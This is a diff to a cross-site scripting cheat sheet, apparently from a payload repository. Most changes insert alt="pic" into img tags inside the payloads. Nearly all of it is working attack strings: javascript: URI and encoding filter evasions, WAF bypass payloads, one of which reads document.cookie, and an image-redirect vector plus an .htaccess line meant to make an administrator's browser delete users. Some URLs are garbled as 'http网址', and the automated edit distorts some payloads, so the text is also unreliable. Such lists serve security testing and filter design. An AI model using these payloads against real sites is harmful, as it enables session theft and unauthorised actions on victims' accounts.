@@ -431,7 +431,7 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 Image XSS using the JavaScript directive (IE7.0 doesn’t support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:
 
 ```js
-<IMG SRC="javascript:alert('XSS');">
+<img alt="pic" src="javascript:alert('XSS');">
 ```
 
 ## No Quotes and no Semicolon
@@ -548,28 +548,28 @@ This is also a viable XSS attack against the above string `$tmp_string=~ s/.*\&#
 Used to break up the cross site scripting attack:
 
 ```js
-<IMG SRC="javascript:alert('XSS');">
+<img alt="pic" src="javascript:alert('XSS');">
 ```
 
 ## Embedded Encoded Tab
 Use this one to break up XSS :
 
 ```js
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<img alt="pic" src="jav&#x09;ascript:alert('XSS');">
 ```
 
 ## Embedded Newline to Break-up XSS
 Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:
 
 ```js
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<img alt="pic" src="jav&#x0A;ascript:alert('XSS');">
 ```
 
 ## Embedded Carriage Return to Break-up XSS
 (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I’ve seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
 
 ```js
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<img alt="pic" src="jav&#x0D;ascript:alert('XSS');">
 ```
 
 ## Null breaks up JavaScript Directive
@@ -590,7 +590,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 - The actual reality is you can have any char from 1-32 in decimal:
 
 ```js
-<IMG SRC=" &#14; javascript:alert('XSS');">
+<img alt="pic" src=" &#14; javascript:alert('XSS');">
 ```
 
 ## Non-alpha-non-digit XSS
@@ -717,7 +717,7 @@ Fairly esoteric issue dealing with embedding images for bulleted lists. This wil
 ## Livescript (older versions of Netscape only)
 
 ```js
-<IMG SRC="livescript:[code]">
+<img alt="pic" src="livescript:[code]">
 ```
 
 
@@ -1086,7 +1086,7 @@ XML Data Island with CDATA Obfuscation
 This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode - vector found by Sec Consult while auditing Yahoo:
 
 ```js
-<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
+<XML ID="xss"><I><B><img alt="pic" src="javas<!-- -->cript:alert('XSS')"></B></I></XML>
 <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 
 ```
@@ -1136,11 +1136,11 @@ IMG Embedded Commands
 This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc…. This is one of the lesser used but more useful XSS vectors:
 
 ```js
-<IMG SRC="http网址www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<img alt="pic" src="http网址www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
 ```
 
 IMG Embedded Commands part II
-This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `<IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):
+This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `<img alt="pic" src="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):
 
 ```js
 Redirect 302 /a.jpg http网址victimsite.com/admin.asp&deleteuser
@@ -1454,12 +1454,12 @@ WAF ByPass Strings for XSS.
 <applet code="javascript:confirm(document.cookie);">
 <isindex x="javascript:" onmouseover="alert(XSS)">
 "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-"><img src="x:x" onerror="alert(XSS)">
+"><img alt="pic" src="x:x" onerror="alert(XSS)">
 "><iframe src="javascript:alert(XSS)">
 <object data="javascript:alert(XSS)">
 <isindex type=image src=1 onerror=alert(XSS)>
 <img src=x:alert(alt) onerror=eval(src) alt=0>
-<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<img alt="pic" src="x:gif" onerror="window['al\u0065rt'](0)"></img>
 <iframe/src="data:text/html,<svg onload=alert(1)>">
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
 <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
@@ -1469,7 +1469,7 @@ WAF ByPass Strings for XSS.
 </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
 <style>//*{x:expression(alert(/xss/))}//<style></style>
 On Mouse Over​
-<img src="/" =_=" title="onerror='prompt(1)'">
+<img alt="pic" src="/" =_=" title="onerror='prompt(1)'">
 <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
 <script x> alert(1) </script 1=2
 <form><button formaction=javascript&colon;alert(1)>CLICKME
